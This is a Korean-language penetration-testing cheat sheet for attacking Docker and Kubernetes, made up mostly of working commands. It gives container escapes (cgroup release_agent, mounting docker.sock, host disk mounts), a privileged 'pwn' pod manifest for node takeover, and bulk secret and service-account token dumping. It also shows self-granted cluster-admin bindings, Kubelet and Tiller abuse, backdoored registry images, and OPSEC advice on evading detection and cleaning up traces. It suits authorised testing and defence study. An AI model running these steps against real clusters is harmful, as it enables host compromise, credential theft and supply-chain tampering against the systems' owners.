# Container / Kubernetes

Docker, containerd, Kubernetes 환경의 공격. 컨테이너 탈출(에스케이프) 과 클러스터 권한 상승을 다룬다.

> 클라우드 IAM 연계 (EKS / AKS / GKE 의 Workload Identity, IRSA) 는 [Cloud 공격](index.md) 참고.

---

## Docker / 컨테이너 탈출

### 식별

```bash
# 컨테이너 안에서 자기 자신 확인
cat /proc/1/cgroup | grep -E 'docker|kubepods|containerd'
ls /.dockerenv 2>/dev/null && echo "Docker"
mount | grep -E 'overlay|kubernetes'
hostname  # 보통 짧은 hex
```

### 권한/기능 확인

```bash
# 활성화된 capability
capsh --print
grep Cap /proc/self/status

# 위험한 capability
# - cap_sys_admin   → 거의 root 동급
# - cap_sys_module  → 커널 모듈 로드
# - cap_sys_ptrace  → 호스트 프로세스 attach
# - cap_dac_read_search → DAC 우회 읽기
# - cap_net_admin   → 네트워크 조작

# privileged 컨테이너 여부
ls -la /dev | wc -l   # 많으면 privileged 가능성
fdisk -l 2>/dev/null  # 호스트 디스크 보임 = privileged
```

### 탈출 기법별

#### 1) Privileged 컨테이너

```bash
# 호스트 디스크 마운트 → 호스트 파일 수정
mkdir /tmp/host && mount /dev/sda1 /tmp/host
# /tmp/host/etc/cron.d/ 또는 /tmp/host/root/.ssh/authorized_keys 수정

# release_agent 트릭 (cgroup v1)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "id > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```

#### 2) Docker Socket 노출 (`/var/run/docker.sock`)

```bash
ls -la /var/run/docker.sock
# 보이면 호스트 = root

# 호스트 루트 마운트한 새 컨테이너 생성
docker -H unix:///var/run/docker.sock run -it --rm \
  --privileged --pid=host --net=host -v /:/host alpine \
  chroot /host bash
```

#### 3) `cap_sys_module`

```bash
# 악성 커널 모듈 로드 → 호스트 커널에 코드 실행
# (호스트와 동일 커널 버전으로 build 필요)
insmod evil.ko
```

#### 4) `cap_sys_ptrace` + shareProcessNamespace / `--pid=host`

```bash
# 호스트 PID namespace 공유 시
ps auxf
# 호스트 프로세스에 attach → shellcode injection
gdb -p <host_pid>
```

#### 5) Mount Volume Misconfig (호스트 경로 마운트)

```bash
# /etc, /root, /var/run/docker.sock 등 host path mount
mount | grep -E 'on /etc| on /root| on /var/run/docker.sock'
# → 발견 시 해당 경로로 호스트 파일 직접 수정
```

#### 6) DirtyPipe / DirtyCOW / overlayfs 류 커널 익스플로잇

호스트와 컨테이너는 커널을 공유 → 커널 LPE 가 곧 탈출.

```bash
uname -a
# 해당 커널 취약점 매핑 후 익스플로잇
```

### 자동화 도구

```bash
# 컨테이너 안에서 한 번에 점검
deepce.sh           # https://github.com/stealthcopter/deepce
amicontained        # https://github.com/genuinetools/amicontained
```

---

## Kubernetes

### 환경 감지 / 식별

```bash
# 파드 안에서
env | grep -i kube
ls /var/run/secrets/kubernetes.io/serviceaccount/

# ServiceAccount token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}

curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1
```

### 권한 열거

```bash
# kubectl 사용 (이미 있을 때)
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets
kubectl auth can-i '*' '*'

# 모든 네임스페이스에서
kubectl auth can-i --list -A 2>/dev/null

# kubectl 없을 때 (curl)
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -H 'Content-Type: application/json' \
  -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}'

# 자동 도구
kubectl-who-can list secrets
peirates           # 대화형 K8s 펜테스트 도구
```

### 시크릿 / ConfigMap 추출

```bash
kubectl get secrets -A -o yaml > secrets.yaml
kubectl get cm -A -o yaml > configmaps.yaml

# 디코드
kubectl get secret <name> -o jsonpath='{.data.password}' | base64 -d

# 모든 네임스페이스의 시크릿 일괄 dump (권한 있을 때)
for ns in $(kubectl get ns -o name | cut -d/ -f2); do
  kubectl get secrets -n $ns -o yaml >> all-secrets.yaml
done
```

### 권한 상승 패턴

#### 1) Pod 생성 권한 → 노드 장악

```yaml
# privileged + hostPath / 호스트 PID 로 파드 생성 → 노드 root
apiVersion: v1
kind: Pod
metadata:
  name: pwn
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: alpine
    command: ["/bin/sh","-c","sleep 1d"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
```

```bash
kubectl apply -f pwn.yaml
kubectl exec -it pwn -- chroot /host bash
```

#### 2) `nodes/proxy`, `pods/exec`, `pods/attach`

```bash
# 다른 파드/노드에 명령 실행
kubectl exec -n kube-system <pod> -- /bin/sh
kubectl get --raw "/api/v1/nodes/<node>/proxy/run/?cmd=id"
```

#### 3) RoleBinding / ClusterRoleBinding 변경

```bash
# rolebindings 생성/수정 권한이 있으면 자기 자신을 cluster-admin 으로 승격
kubectl create clusterrolebinding pwn \
  --clusterrole=cluster-admin --serviceaccount=default:default
```

#### 4) `secrets` get → 다른 SA token 탈취

```bash
# legacy SA token (k8s < 1.24) 또는 수동 생성된 token
kubectl get secrets -A | grep token
kubectl get secret <token-secret> -n <ns> -o jsonpath='{.data.token}' | base64 -d
# → 더 높은 권한 SA 의 token으로 재인증
```

#### 5) ImagePullSecrets / Helm value 노출

```bash
kubectl get secret -A -o yaml | grep -A2 dockerconfigjson
kubectl get secret <regcred> -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d
# → 사설 레지스트리 credential → 내부 이미지 변조
```

### 자동 점검 도구

```bash
# Peirates - 대화형
peirates

# kubescape - CIS / NSA / MITRE 매핑 스캔
kubescape scan --enable-host-scan

# kube-hunter - 외부 / 내부 모드
kube-hunter --remote <api_server>
kube-hunter --pod              # 파드 내부에서
```

---

## 컨테이너 레지스트리 / Supply Chain

```bash
# 노출된 레지스트리 식별
curl http://<registry>:5000/v2/_catalog
curl http://<registry>:5000/v2/<repo>/tags/list

# 익명 푸시 가능 시 - 악성 이미지 등록
docker push <registry>:5000/<repo>:latest

# 이미지 분석 / 시크릿 검색
trivy image <image>
dive <image>
syft <image> -o json
grype <image>
```

---

## OPSEC

- `kubectl` 액션은 **API server audit log** 에 사용자/SA + 리소스 + IP 와 함께 기록됨
- 새 파드 / 새 RoleBinding 은 **EDR / Falco / Tetragon** 에 즉시 잡힘
- privileged 파드, hostPath, hostPID 는 PodSecurity / Kyverno / OPA 정책에서 차단되어 있을 가능성 높음 → 미리 ConfigMap / dry-run 으로 확인
- 작업 후 추가한 파드 / RoleBinding / 시크릿 정리

```bash
kubectl delete pod pwn
kubectl delete clusterrolebinding pwn
```

---

## 참고

- [Falco rules](https://github.com/falcosecurity/rules) — 잡힐만한 행위 사전 확인
- [Peirates](https://github.com/inguardians/peirates) — K8s 펜테스트
- [BustaKube](https://github.com/cyberark/kubesploit), [hadolint](https://github.com/hadolint/hadolint), [trivy](https://github.com/aquasecurity/trivy)
- 관련: [Cloud 공격](index.md) (IRSA / Workload Identity / Pod Identity)

---

## 서비스 포트 기반 열거 및 공격

### Kubelet API (10250) 익명 접근

Kubelet API에 익명 접근(`--anonymous-auth=true`)이 허용되어 있다면, token 없이 팟 내에서 명령어 실행이 가능하다.

```bash
# Kubelet 포트 확인 (일반적으로 10250, 10255(read-only))
curl -sk https://<node-ip>:10250/pods | jq .

# 팟 정보 파싱 후 명령 실행 (예: namespace: default, pod: nginx, container: nginx)
curl -sk -X POST "https://<node-ip>:10250/run/default/nginx/nginx" -d "cmd=ls -la"
```

### Helm Tiller (44134, Helm v2)

Helm v2 환경에서 Tiller 포트가 노출된 경우, gRPC를 통해 악의적인 차트를 배포해 클러스터 전체 권한을 획득할 수 있다. (Helm v3에서는 제거됨)

```bash
# 포트 스캔으로 44134 확인 후, 로컬 helm 클라이언트 연결
export HELM_HOST=<target-ip>:44134
helm install --name pwned ./malicious-chart
```

### Docker Registry (5000)

사설 레지스트리가 인증 없이 열려있을 때, 컨테이너 이미지를 다운로드하거나 백도어 이미지를 푸시할 수 있다.

```bash
# 카탈로그 확인
curl -s http://<registry-ip>:5000/v2/_catalog
# 이미지 태그 확인
curl -s http://<registry-ip>:5000/v2/<image-name>/tags/list
```

---

## RBAC 권한 남용 및 공격

1. **`create pods`**: `hostPath`, `hostPID`, `privileged` 플래그를 활용한 권한 상승 팟 생성
2. **`list/get secrets`**: K8s 내부 시크릿(다른 SA의 token 등) 탈취
3. **`create/update daemonsets/deployments`**: 워크로드 수정을 통한 악의적 컨테이너 실행
4. **`bind` (ClusterRoleBinding / RoleBinding)**: 기존 SA에 클러스터 관리자 권한 부여
   ```bash
   kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:pwned-sa
   ```
5. **`impersonate`**: 상위 권한의 유저/그룹으로 위장하여 명령 실행
   ```bash
   kubectl get secrets --as=system:admin
   kubectl get secrets --as-group=system:masters
   ```
